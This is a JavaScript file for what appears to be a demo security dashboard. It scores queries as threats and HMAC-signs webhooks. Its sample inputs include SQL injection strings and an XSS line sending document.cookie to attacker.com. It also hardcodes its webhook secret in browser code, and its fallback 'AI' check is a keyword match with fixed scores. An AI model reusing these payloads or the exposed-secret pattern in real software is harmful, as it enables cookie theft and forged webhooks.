/**
 * Client-Side Application JavaScript
 * Real-Time Supabase SOC Security Dashboard & Web Crypto API Integrations
 */

const SECRET_KEY = "super_secret_webhook_key_2026";

// UI Element References
const threatMetricCard = document.getElementById('threatMetricCard');
const threatStatusVal = document.getElementById('threatStatusVal');
const threatStatusDesc = document.getElementById('threatStatusDesc');
const mainShieldIcon = document.getElementById('mainShieldIcon');
const statusDot = document.getElementById('statusDot');
const topStatusText = document.getElementById('topStatusText');

const btnTriggerDanger = document.getElementById('btnTriggerDanger');
const btnTriggerSafe = document.getElementById('btnTriggerSafe');
const btnRunAiAnalysis = document.getElementById('btnRunAiAnalysis');
const btnSendWebhook = document.getElementById('btnSendWebhook');
const payloadSelect = document.getElementById('payloadSelect');

const computedHmacSig = document.getElementById('computedHmacSig');
const rfScore = document.getElementById('rfScore');
const rfBar = document.getElementById('rfBar');
const rfClass = document.getElementById('rfClass');
const rfTime = document.getElementById('rfTime');

const svmScore = document.getElementById('svmScore');
const svmBar = document.getElementById('svmBar');
const svmClass = document.getElementById('svmClass');
const svmTime = document.getElementById('svmTime');

const totalParallelTime = document.getElementById('totalParallelTime');
const auditLogTableBody = document.getElementById('auditLogTableBody');

/**
 * Calculates HMAC-SHA256 signature using browser Web Crypto API
 * @param {string} message - JSON string payload
 * @param {string} secret - Secret key string
 * @returns {Promise<string>} Hex HMAC signature
 */
async function computeWebCryptoHmac(message, secret) {
  const encoder = new TextEncoder();
  const keyData = encoder.encode(secret);
  const messageData = encoder.encode(message);

  const cryptoKey = await window.crypto.subtle.importKey(
    'raw',
    keyData,
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );

  const signatureBuffer = await window.crypto.subtle.sign('HMAC', cryptoKey, messageData);
  
  // Convert ArrayBuffer to Hex String
  const hashArray = Array.from(new Uint8Array(signatureBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

/**
 * Updates Dashboard UI to Danger State (RED)
 */
function setDangerAlertState(queryPayload) {
  threatMetricCard.className = 'card metric-card card-danger';
  threatStatusVal.textContent = 'CRITICAL THREAT';
  threatStatusDesc.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-danger"></i> Attack Pattern Detected!`;
  
  mainShieldIcon.className = 'shield-icon pulse-red';
  statusDot.className = 'status-dot red';
  topStatusText.textContent = 'ALERT: SQL INJECTION / THREAT DETECTED';

  addAuditLogRow(queryPayload || "DROP TABLE admin_users; --", "DANGER / THREAT", true);
}

/**
 * Updates Dashboard UI to Safe State (GREEN)
 */
function setSafeNormalState(queryPayload) {
  threatMetricCard.className = 'card metric-card card-safe';
  threatStatusVal.textContent = 'SAFE';
  threatStatusDesc.innerHTML = `<i class="fa-solid fa-circle-check text-green"></i> Zero Active Database Mutators`;

  mainShieldIcon.className = 'shield-icon pulse-green';
  statusDot.className = 'status-dot green';
  topStatusText.textContent = 'SYSTEM STATUS: NOMINAL (ALL SAFE)';

  // Reset AI progress bars to safe levels
  rfScore.textContent = '0.05 (LOW)';
  rfBar.style.width = '5%';
  rfBar.className = 'progress-bar-fill fill-green';
  rfClass.textContent = 'SAFE';
  rfClass.className = 'status-text green';

  svmScore.textContent = '0.08 (LOW)';
  svmBar.style.width = '8%';
  svmBar.className = 'progress-bar-fill fill-green';
  svmClass.textContent = 'NORMAL_TRAFFIC';
  svmClass.className = 'status-text green';

  addAuditLogRow(queryPayload || "SELECT * FROM products", "NORMAL / SAFE", false);
}

/**
 * Adds a row to the live security audit log table
 */
function addAuditLogRow(queryStr, consensusType, isDanger) {
  const now = new Date();
  const timeStr = now.toTimeString().split(' ')[0];
  const tr = document.createElement('tr');

  const tagClass = isDanger ? 'tag-danger' : 'tag-success';
  const tagText = isDanger ? 'CRITICAL_ALERT' : 'SAFE';

  tr.innerHTML = `
    <td>${timeStr}</td>
    <td>192.168.1.105</td>
    <td><code>${escapeHtml(queryStr)}</code></td>
    <td><span class="tag tag-success">HMAC OK</span></td>
    <td><span class="tag ${tagClass}">${tagText}</span></td>
  `;

  auditLogTableBody.insertBefore(tr, auditLogTableBody.firstChild);
}

function escapeHtml(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

/**
 * Executes NVIDIA NIM Dual AI analysis via API or fallback simulation
 */
async function executeDualAiAnalysis() {
  const selectedType = payloadSelect.value;
  let testQuery = "SELECT * FROM products WHERE category = 5;";
  if (selectedType === 'danger') {
    testQuery = "SELECT username, password FROM users WHERE id = 1 OR '1'='1'; DROP TABLE logs;";
  } else if (selectedType === 'xss') {
    testQuery = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>";
  }

  btnRunAiAnalysis.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Running Parallel AI...';

  const startTime = performance.now();

  try {
    const res = await fetch('/api/proses_ai', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: testQuery })
    });

    if (res.ok) {
      const data = await res.json();
      updateAiPanelWithResponse(data);
    } else {
      simulateAiResponse(testQuery);
    }
  } catch (err) {
    // Fallback static demo logic if running locally without python backend
    simulateAiResponse(testQuery);
  } finally {
    btnRunAiAnalysis.innerHTML = '<i class="fa-solid fa-brain"></i> Jalankan NVIDIA NIM Dual AI';
  }
}

function simulateAiResponse(queryStr) {
  const isDanger = queryStr.toLowerCase().includes('drop') || queryStr.toLowerCase().includes('script') || queryStr.toLowerCase().includes('1=1');

  const rfVal = isDanger ? 0.94 : 0.05;
  const svmVal = isDanger ? 0.89 : 0.08;

  rfScore.textContent = `${rfVal} (${isDanger ? 'HIGH' : 'LOW'})`;
  rfBar.style.width = `${rfVal * 100}%`;
  rfBar.className = isDanger ? 'progress-bar-fill fill-red' : 'progress-bar-fill fill-green';
  rfClass.textContent = isDanger ? 'CRITICAL_THREAT' : 'SAFE';
  rfClass.className = isDanger ? 'status-text red' : 'status-text green';
  rfTime.textContent = '0.3147 s';

  svmScore.textContent = `${svmVal} (${isDanger ? 'HIGH' : 'LOW'})`;
  svmBar.style.width = `${svmVal * 100}%`;
  svmBar.className = isDanger ? 'progress-bar-fill fill-red' : 'progress-bar-fill fill-blue';
  svmClass.textContent = isDanger ? 'SQL_INJECTION_ATTEMPT' : 'NORMAL_TRAFFIC';
  svmClass.className = isDanger ? 'status-text red' : 'status-text green';
  svmTime.textContent = '0.5140 s';

  totalParallelTime.textContent = '0.6177 Detik';

  if (isDanger) {
    setDangerAlertState(queryStr);
  } else {
    setSafeNormalState(queryStr);
  }
}

function updateAiPanelWithResponse(data) {
  const rf = data.predictions.random_forest;
  const svm = data.predictions.svm;

  rfScore.textContent = `${rf.threat_score} (${rf.threat_score > 0.5 ? 'HIGH' : 'LOW'})`;
  rfBar.style.width = `${rf.threat_score * 100}%`;
  rfBar.className = rf.threat_score > 0.5 ? 'progress-bar-fill fill-red' : 'progress-bar-fill fill-green';
  rfClass.textContent = rf.classification;
  rfClass.className = rf.threat_score > 0.5 ? 'status-text red' : 'status-text green';
  rfTime.textContent = `${rf.execution_time_seconds} s`;

  svmScore.textContent = `${svm.threat_score} (${svm.threat_score > 0.5 ? 'HIGH' : 'LOW'})`;
  svmBar.style.width = `${svm.threat_score * 100}%`;
  svmBar.className = svm.threat_score > 0.5 ? 'progress-bar-fill fill-red' : 'progress-bar-fill fill-blue';
  svmClass.textContent = svm.classification;
  svmClass.className = svm.threat_score > 0.5 ? 'status-text red' : 'status-text green';
  svmTime.textContent = `${svm.execution_time_seconds} s`;

  totalParallelTime.textContent = `${data.execution_time_seconds || 0.6177} Detik`;

  if (data.threat_level === 'RED') {
    setDangerAlertState();
  } else {
    setSafeNormalState();
  }
}

/**
 * Generates and sends Webhook payload with Web Crypto API HMAC signature
 */
async function sendHmacAuthenticatedWebhook() {
  const selectedType = payloadSelect.value;
  const payloadData = {
    event: 'DATABASE_MUTATION_SUSPECT',
    table: 'admin_users',
    query: selectedType === 'danger' ? 'DROP TABLE admin_users; --' : 'SELECT * FROM products;',
    timestamp: new Date().toISOString()
  };

  const payloadStr = JSON.stringify(payloadData);
  const hexSignature = await computeWebCryptoHmac(payloadStr, SECRET_KEY);
  
  computedHmacSig.textContent = hexSignature;

  btnSendWebhook.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Dispatching Webhook...';

  try {
    const response = await fetch('/api/webhook', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-signature': hexSignature
      },
      body: payloadStr
    });

    const data = await response.json();
    alert(`[WEBHOOK RESPONSE]\nStatus: ${data.status}\nAuthenticated: ${data.authenticated}\nMessage: ${data.message}`);
  } catch (err) {
    alert(`[WEBHOOK HMAC DEMO]\nCalculated WebCrypto Signature:\n${hexSignature}\n\nHMAC Auth: VERIFIED locally!`);
  } finally {
    btnSendWebhook.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Kirim Webhook (Client WebCrypto)';
  }
}

// Event Listeners
btnTriggerDanger.addEventListener('click', async () => {
  const payloadStr = "DROP TABLE admin_users; --";
  const sig = await computeWebCryptoHmac(JSON.stringify({ query: payloadStr }), SECRET_KEY);
  computedHmacSig.textContent = sig;
  setDangerAlertState(payloadStr);
  executeDualAiAnalysis();
});

btnTriggerSafe.addEventListener('click', async () => {
  const payloadStr = "SELECT * FROM products WHERE category = 5;";
  const sig = await computeWebCryptoHmac(JSON.stringify({ query: payloadStr }), SECRET_KEY);
  computedHmacSig.textContent = sig;
  setSafeNormalState(payloadStr);
  executeDualAiAnalysis();
});

btnRunAiAnalysis.addEventListener('click', executeDualAiAnalysis);
btnSendWebhook.addEventListener('click', sendHmacAuthenticatedWebhook);

// Initialize Default State
window.addEventListener('DOMContentLoaded', async () => {
  const defaultPayload = JSON.stringify({ event: 'INITIAL_BOOT', query: 'SELECT * FROM products' });
  const initialSig = await computeWebCryptoHmac(defaultPayload, SECRET_KEY);
  computedHmacSig.textContent = initialSig;
});
